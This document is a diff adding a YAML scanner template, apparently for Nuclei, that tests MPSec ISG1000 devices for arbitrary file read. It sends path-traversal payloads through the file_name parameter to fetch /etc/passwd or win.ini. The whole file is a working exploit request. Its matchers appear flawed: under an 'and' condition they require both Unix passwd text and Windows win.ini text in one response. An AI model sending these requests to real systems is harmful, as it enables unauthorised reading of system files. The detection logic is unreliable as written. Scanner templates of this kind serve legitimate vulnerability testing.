@@ -1,0 +1,41 @@
+id: mpsec-isg1000-arbitrary-file-read
+
+info:
+  name: MPSec ISG1000 Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+
+variables:
+  v_path:
+    - '../../../../../../../../../../../../etc/passwd'
+    - '../../../../../../../../../../../../c:/windows/win.ini'
+
+http:
+  - raw:
+      - |
+        GET /webui/?g=sys_dia_data_down&file_name=§v_path§ HTTP/1.1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:86.0) Gecko/20100101 Firefox/86.0
+        Content-Type: application/x-www-form-urlencoded
+        Host: {{Hostname}}
+
+    payloads:
+      v_path:
+        - '{{v_path}}'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "; for 16-bit app support"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
